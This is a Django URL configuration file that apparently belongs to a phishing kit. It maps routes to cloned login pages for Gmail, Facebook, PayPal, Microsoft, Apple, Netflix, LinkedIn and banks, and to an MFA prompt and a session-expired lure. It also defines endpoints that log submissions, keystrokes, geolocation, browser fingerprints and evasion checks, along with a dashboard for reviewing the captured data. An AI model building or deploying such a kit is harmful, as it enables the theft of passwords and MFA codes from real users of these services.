from django.urls import path
from . import views

app_name = 'base'

urlpatterns = [
    path('gmail/', views.PhishingPageView.as_view(template_name='base/gmail_clone.html')),
    path('facebook/', views.PhishingPageView.as_view(template_name='base/facebook_clone.html')),
    path('mfa/', views.PhishingPageView.as_view(template_name='base/mfa_prompt.html'), name='mfa'),
    path('bank/', views.PhishingPageView.as_view(template_name='base/bank_clone.html')),
    path('paypal/', views.PhishingPageView.as_view(template_name='base/paypal_clone.html')),
    path('microsoft/', views.PhishingPageView.as_view(template_name='base/microsoft_clone.html')),
    path('linkedin/', views.PhishingPageView.as_view(template_name='base/linkedin_clone.html')),
    path('apple/', views.PhishingPageView.as_view(template_name='base/apple_clone.html')),
    path('custombank/', views.PhishingPageView.as_view(template_name='base/custom_bank_clone.html')),
    path('netflix/', views.PhishingPageView.as_view(template_name='base/netflix_clone.html')),
    path('session-expired/', views.PhishingPageView.as_view(template_name='base/session_expired.html')),
    path('log-submission/', views.log_submission, name='log-submission'),
    path('submit/', views.handle_submission, name='submit'),
    path('log-keystroke/', views.log_keystroke, name='log-keystroke'),
    path('log-geo/', views.log_geo, name='log-geo'),
    path('log-fingerprint/', views.log_fingerprint, name='log-fingerprint'),
    path('log-evasion_detection/', views.log_evasion, name='log-evasion-detection'),
    path('dashboard/', views.view_logs, name='dashboard'),
    path('export-project/', views.export_project, name='export-project'),
]